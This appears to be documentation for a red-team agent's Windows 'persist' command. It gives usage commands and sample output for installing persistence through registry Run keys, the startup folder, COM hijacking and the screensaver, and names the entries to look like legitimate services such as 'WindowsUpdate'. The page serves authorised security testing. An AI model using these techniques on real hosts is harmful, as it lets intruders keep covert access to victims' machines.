+++
title = "persist"
chapter = false
weight = 125
hidden = false
+++

{{% notice info %}}Windows Only{{% /notice %}}

## Summary

Install or remove persistence mechanisms on a Windows host. Supports five methods: registry Run key, startup folder, COM hijacking, screensaver hijacking, and a `list` action to enumerate existing entries across all methods.

### Arguments

| Parameter | Type | Required | Default | Description |
|-----------|------|----------|---------|-------------|
| method | choose_one | Yes | registry | Persistence method: `registry`, `startup-folder`, `com-hijack`, `screensaver`, or `list` |
| action | choose_one | No | install | `install` to add persistence, `remove` to delete it |
| name | string | No* | - | Registry value name or startup folder filename (*required for registry, defaults to exe name for startup) |
| path | string | No | Current agent | Path to executable. Defaults to the running agent binary. |
| hive | choose_one | No | HKCU | `HKCU` (current user, no admin needed) or `HKLM` (all users, admin required). Used by `registry` method. |
| clsid | string | No | {42aedc87-...} | COM object CLSID to hijack. Default is MruPidlList (loaded by explorer.exe at logon). Used by `com-hijack` method. |
| timeout | string | No | 60 | Idle timeout in seconds before screensaver triggers. Used by `screensaver` method. |

## Usage

### Registry Run Key Persistence

Install a Run key for the current agent (HKCU, no admin):
```
persist -method registry -action install -name "WindowsUpdate"
```

Install a Run key with custom path (HKLM, requires admin):
```
persist -method registry -action install -name "SecurityService" -path "C:\Windows\Temp\svc.exe" -hive HKLM
```

Remove a Run key:
```
persist -method registry -action remove -name "WindowsUpdate" -hive HKCU
```

### Startup Folder Persistence

Copy agent to user's Startup folder:
```
persist -method startup-folder -action install -name "updater.exe"
```

Remove from Startup folder:
```
persist -method startup-folder -action remove -name "updater.exe"
```

### COM Hijacking Persistence

Hijack a COM object CLSID so that when explorer.exe (or another application) loads the COM object, your DLL/EXE runs instead. Uses HKCU InprocServer32 override — no admin required.

Install with default CLSID (MruPidlList, loaded by explorer.exe at user logon):
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll"
```

Install with a specific CLSID:
```
persist -method com-hijack -action install -path "C:\Users\user\payload.dll" -clsid "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
```

Remove COM hijack:
```
persist -method com-hijack -action remove -clsid "{42aedc87-2188-41fd-b9a3-0c966feabec1}"
```

### Screensaver Hijacking Persistence

Set the Windows screensaver to your payload. When the user is idle for the configured timeout, winlogon.exe launches the payload. Uses HKCU registry — no admin required.

Install screensaver persistence (triggers after 5 minutes idle):
```
persist -method screensaver -action install -path "C:\Users\user\payload.exe" -timeout 300
```

Install with default timeout (60 seconds):
```
persist -method screensaver -action install
```

Remove screensaver persistence:
```
persist -method screensaver -action remove
```

### List Existing Persistence

Enumerate all known persistence entries — registry Run keys (HKCU + HKLM), startup folder, COM hijack entries, and screensaver settings:
```
persist -method list
```

### Example Output (list)
```
=== Persistence Entries ===

--- HKCU\Software\Microsoft\Windows\CurrentVersion\Run ---
  OneDrive = "C:\Users\setup\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

--- HKLM\Software\Microsoft\Windows\CurrentVersion\Run ---
  SecurityHealth = %windir%\system32\SecurityHealthSystray.exe

--- Startup Folder: C:\Users\setup\AppData\Roaming\...\Startup ---
  desktop.ini (174 bytes)

--- COM Hijacking (HKCU InprocServer32 overrides) ---
  {42aedc87-2188-41fd-b9a3-0c966feabec1}  MruPidlList (explorer.exe) = C:\Users\setup\payload.dll

--- Screensaver (HKCU\Control Panel\Desktop) ---
  SCRNSAVE.EXE    = C:\Users\setup\payload.exe
  ScreenSaveActive = 1 (Yes)
  ScreenSaveTimeout = 300 seconds
```

## MITRE ATT&CK Mapping

- T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- T1547.009 — Boot or Logon Autostart Execution: Shortcut Modification
- T1546.015 — Event Triggered Execution: Component Object Model Hijacking
- T1546.002 — Event Triggered Execution: Screensaver
